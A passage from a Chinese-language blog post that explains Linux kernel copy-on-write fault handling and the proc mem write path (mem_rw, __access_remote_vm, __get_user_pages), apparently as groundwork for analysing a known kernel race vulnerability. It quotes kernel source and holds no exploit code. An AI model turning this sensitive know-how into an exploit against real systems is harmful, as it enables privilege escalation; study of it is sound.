FAULT_FLAG_WRITE))</span><br><span class="line"><span class="keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">orig_pte);</span><br><span class="line"><span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))</span><br><span class="line"><span class="keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">orig_pte);</span><br><span class="line"><span class="keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要就是下面判断，如果是非写的操作引起的异常则进入<code>do_read_fault</code>函数，如果是非共享内存引起的异常则进入<code>do_cow_fault</code>，如果是因为共享内存引起的异常则进入<code>do_shared_fault</code>函数中去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_cow_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">pgoff_t</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">fault_page</span>, *<span class="title">new_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line"><span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(anon_vma_prepare(vma)))</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line">new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);</span><br><span class="line"><span class="keyword">if</span> (!new_page)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mem_cgroup_try_charge(new_page, mm, GFP_KERNEL, &amp;memcg)) &#123;</span><br><span class="line">page_cache_release(new_page);</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))</span><br><span class="line"><span class="keyword">goto</span> uncharge_out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fault_page)</span><br><span class="line">copy_user_highpage(new_page, fault_page, address, vma);</span><br><span class="line">__SetPageUptodate(new_page);</span><br><span class="line"></span><br><span class="line">pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pte_same(*pte, orig_pte))) &#123;</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line"><span class="keyword">if</span> (fault_page) &#123;</span><br><span class="line">unlock_page(fault_page);</span><br><span class="line">page_cache_release(fault_page);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The fault handler has no page to lock, so it holds</span></span><br><span class="line"><span class="comment"> * i_mmap_lock for read to protect against truncate.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">goto</span> uncharge_out;</span><br><span class="line">&#125;</span><br><span class="line">do_set_pte(vma, address, new_page, pte, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">mem_cgroup_commit_charge(new_page, memcg, <span class="literal">false</span>);</span><br><span class="line">lru_cache_add_active_or_unevictable(new_page, vma);</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line"><span class="keyword">if</span> (fault_page) &#123;</span><br><span class="line">unlock_page(fault_page);</span><br><span class="line">page_cache_release(fault_page);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The fault handler has no page to lock, so it holds</span></span><br><span class="line"><span class="comment"> * i_mmap_lock for read to protect against truncate.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">uncharge_out:</span><br><span class="line">mem_cgroup_cancel_charge(new_page, memcg);</span><br><span class="line">page_cache_release(new_page);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据名字可以看出来这个函数是我们比较关注的函数，<code>new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);</code>首先则就是创建一个物理页。<code>ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);</code>这里读取文件的内容到<code>fault_page</code>中去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fault_page)</span><br><span class="line">  copy_user_highpage(new_page, fault_page, address, vma);</span><br></pre></td></tr></table></figure><p>随后在这里将<code>fault_page</code>中的内容拷贝到<code>new_page</code>中去。</p><p><code>if (unlikely(!pte_same(*pte, orig_pte))) </code>这里验证pte和<code>orig_ptr</code>是否一致，如果不一致则表示pte中途被修改过那么直接释放两个内存页之后退出。</p><p><code>do_set_pte(vma, address, new_page, pte, true, true);</code>在这里设置pte中的标志位并且标上<code>dirty</code>标志位，不过因为会检测文件是否为可写如果不是则不会标记上<code>write</code>，最后释放<code>fault_page</code>结束函数。</p><p>在进行完第一步之后如果页面不可写的话就会进入到第二步中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_wp_page</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">spinlock_t</span> *ptl, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function">__<span class="title">releases</span><span class="params">(ptl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">old_page</span>;</span></span><br><span class="line"></span><br><span class="line">old_page = vm_normal_page(vma, address, orig_pte);</span><br><span class="line"><span class="keyword">if</span> (!old_page) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * VM_MIXEDMAP !pfn_valid() case, or VM_SOFTDIRTY clear on a</span></span><br><span class="line"><span class="comment"> * VM_PFNMAP VMA.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We should not cow pages in a shared writeable mapping.</span></span><br><span class="line"><span class="comment"> * Just mark the pages writable and/or call ops-&gt;pfn_mkwrite.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">     (VM_WRITE|VM_SHARED))</span><br><span class="line"><span class="keyword">return</span> wp_pfn_shared(mm, vma, address, page_table, ptl,</span><br><span class="line">     orig_pte, pmd);</span><br><span class="line"></span><br><span class="line">pte_unmap_unlock(page_table, ptl);</span><br><span class="line"><span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">    orig_pte, old_page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Take out anonymous pages first, anonymous shared vmas are</span></span><br><span class="line"><span class="comment"> * not dirty accountable.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!trylock_page(old_page)) &#123;</span><br><span class="line">page_cache_get(old_page);</span><br><span class="line">pte_unmap_unlock(page_table, ptl);</span><br><span class="line">lock_page(old_page);</span><br><span class="line">page_table = pte_offset_map_lock(mm, pmd, address,</span><br><span class="line"> &amp;ptl);</span><br><span class="line"><span class="keyword">if</span> (!pte_same(*page_table, orig_pte)) &#123;</span><br><span class="line">unlock_page(old_page);</span><br><span class="line">pte_unmap_unlock(page_table, ptl);</span><br><span class="line">page_cache_release(old_page);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">page_cache_release(old_page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (reuse_swap_page(old_page)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The page is all ours.  Move it to our anon_vma so</span></span><br><span class="line"><span class="comment"> * the rmap code will not search our parent or siblings.</span></span><br><span class="line"><span class="comment"> * Protected against the rmap code by the page lock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">page_move_anon_rmap(old_page, vma, address);</span><br><span class="line">unlock_page(old_page);</span><br><span class="line"><span class="keyword">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,</span><br><span class="line">     orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">unlock_page(old_page);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">(VM_WRITE|VM_SHARED))) &#123;</span><br><span class="line"><span class="keyword">return</span> wp_page_shared(mm, vma, address, page_table, pmd,</span><br><span class="line">      ptl, orig_pte, old_page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ok, we need to copy. Oh, well..</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">page_cache_get(old_page);</span><br><span class="line"></span><br><span class="line">pte_unmap_unlock(page_table, ptl);</span><br><span class="line"><span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">    orig_pte, old_page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过<code>old_page = vm_normal_page(vma, address, orig_pte);</code>获取缺页的线性地址对应的<code>struct page</code>结构，对于一些特殊映射的页面（如页面回收、页迁移和KSM等），内核并不希望这些页参与到内存管理的一些流程当中，称之为<code>special mapping</code>，并无对应的<code>struct page</code>结构体。</p><p>紧接着判断是否为<code>special mapping</code>，如果是则会进入if分支，当然我们这里不是。</p><p>随后判断页面是否为匿名页并且不为KSM，如果成立并且可以成功上锁则进入以下语句。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (reuse_swap_page(old_page)) &#123;</span><br><span class="line">  page_move_anon_rmap(old_page, vma, address);</span><br><span class="line">  unlock_page(old_page);</span><br><span class="line">  <span class="keyword">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,</span><br><span class="line">                       orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中首先通过<code>reuse_swap_page</code>判断是否只有一个进程在使用该页，如果是则直接调用<code>wp_page_reuse</code>函数重用该页。如果以上的所有都没满足则进入最后的无法重用进行写时复制。</p><p>那么以上就是COW的全部流程了，接下来分析一下<code>write</code>函数。</p><h3 id="write函数分析"><a href="#write函数分析" class="headerlink" title="write函数分析"></a>write函数分析</h3><p>具体流程其实就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_write() =&gt; vfs_write() =&gt; __vfs_write() =&gt; file-&gt;f_op-&gt;write() =&gt; mem_write() =&gt; mem_rw()</span><br></pre></td></tr></table></figure><h4 id="mem-rw"><a href="#mem-rw" class="headerlink" title="mem_rw"></a><strong>mem_rw</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">mem_rw</span><span class="params">(struct file *file, <span class="keyword">char</span> __user *buf,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *ppos, <span class="keyword">int</span> write)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> file-&gt;private_data;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr = *ppos;</span><br><span class="line"><span class="keyword">ssize_t</span> copied;</span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!mm)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">page = (<span class="keyword">char</span> *)__get_free_page(GFP_TEMPORARY);</span><br><span class="line"><span class="keyword">if</span> (!page)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">copied = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!atomic_inc_not_zero(&amp;mm-&gt;mm_users))</span><br><span class="line"><span class="keyword">goto</span> <span class="built_in">free</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> this_len = <span class="keyword">min_t</span>(<span class="keyword">int</span>, count, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123;</span><br><span class="line">copied = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">this_len = access_remote_vm(mm, addr, page, this_len, write);</span><br><span class="line"><span class="keyword">if</span> (!this_len) &#123;</span><br><span class="line"><span class="keyword">if</span> (!copied)</span><br><span class="line">copied = -EIO;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;</span><br><span class="line">copied = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf += this_len;</span><br><span class="line">addr += this_len;</span><br><span class="line">copied += this_len;</span><br><span class="line">count -= this_len;</span><br><span class="line">&#125;</span><br><span class="line">*ppos = addr;</span><br><span class="line"></span><br><span class="line">mmput(mm);</span><br><span class="line"><span class="built_in">free</span>:</span><br><span class="line">free_page((<span class="keyword">unsigned</span> <span class="keyword">long</span>) page);</span><br><span class="line"><span class="keyword">return</span> copied;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的流程还是听清晰的，首先就是获取一个临时的内存页，紧接着将用户空间的内容放到临时的内存页中即可，接着利用<code>access_remote_vm</code>函数访问内存，然后后面是如果不是写的话就返回内容到用户空间，最后释放临时内存页。</p><h4 id="access-remote-vm"><a href="#access-remote-vm" class="headerlink" title="access_remote_vm"></a><strong>access_remote_vm</strong></h4><p><code>access_remote_vm</code>函数其实就是<code>__access_remote_vm</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __access_remote_vm(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">void</span> *buf, <span class="keyword">int</span> len, <span class="keyword">int</span> write)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line"><span class="keyword">void</span> *old_buf = buf;</span><br><span class="line"></span><br><span class="line">down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line"><span class="comment">/* ignore errors, just check how much was successfully transferred */</span></span><br><span class="line"><span class="keyword">while</span> (len) &#123;</span><br><span class="line"><span class="keyword">int</span> bytes, ret, offset;</span><br><span class="line"><span class="keyword">void</span> *maddr;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">ret = get_user_pages(tsk, mm, addr, <span class="number">1</span>,</span><br><span class="line">write, <span class="number">1</span>, &amp;page, &amp;vma);</span><br><span class="line"><span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Check if this is a VM_IO | VM_PFNMAP VMA, which</span></span><br><span class="line"><span class="comment"> * we can access using slightly different code.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vma = find_vma(mm, addr);</span><br><span class="line"><span class="keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;access)</span><br><span class="line">ret = vma-&gt;vm_ops-&gt;access(vma, addr, buf,</span><br><span class="line">  len, write);</span><br><span class="line"><span class="keyword">if</span> (ret &lt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">bytes = ret;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">bytes = len;</span><br><span class="line">offset = addr &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (bytes &gt; PAGE_SIZE-offset)</span><br><span class="line">bytes = PAGE_SIZE-offset;</span><br><span class="line"></span><br><span class="line">maddr = kmap(page);</span><br><span class="line"><span class="keyword">if</span> (write) &#123;</span><br><span class="line">copy_to_user_page(vma, page, addr,</span><br><span class="line">  maddr + offset, buf, bytes);</span><br><span class="line">set_page_dirty_lock(page);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">copy_from_user_page(vma, page, addr,</span><br><span class="line">    buf, maddr + offset, bytes);</span><br><span class="line">&#125;</span><br><span class="line">kunmap(page);</span><br><span class="line">page_cache_release(page);</span><br><span class="line">&#125;</span><br><span class="line">len -= bytes;</span><br><span class="line">buf += bytes;</span><br><span class="line">addr += bytes;</span><br><span class="line">&#125;</span><br><span class="line">up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> buf - old_buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里通过<code>ret = get_user_pages(tsk, mm, addr, 1, write, 1, &amp;page, &amp;vma);</code>获取到对应目标的内存页。然后通过<code>maddr = kmap(page);</code>建立映射，最后在<code>copy_to_user_page(vma, page, addr, maddr + offset, buf, bytes);</code>中写入。</p><p>那么其中最为重要的即为<code>get_user_pages</code>函数</p><h4 id="get-user-pages"><a href="#get-user-pages" class="headerlink" title="__get_user_pages"></a><strong>__get_user_pages</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">long</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> page_mask;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nr_pages)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">VM_BUG_ON(!!pages != !!(gup_flags &amp; FOLL_GET));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If FOLL_FORCE is set then do not force a full fault as the hinting</span></span><br><span class="line"><span class="comment"> * fault information is unrelated to the reference behaviour of a task</span></span><br><span class="line"><span class="comment"> * using the address space</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!(gup_flags &amp; FOLL_FORCE))</span><br><span class="line">gup_flags |= FOLL_NUMA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span 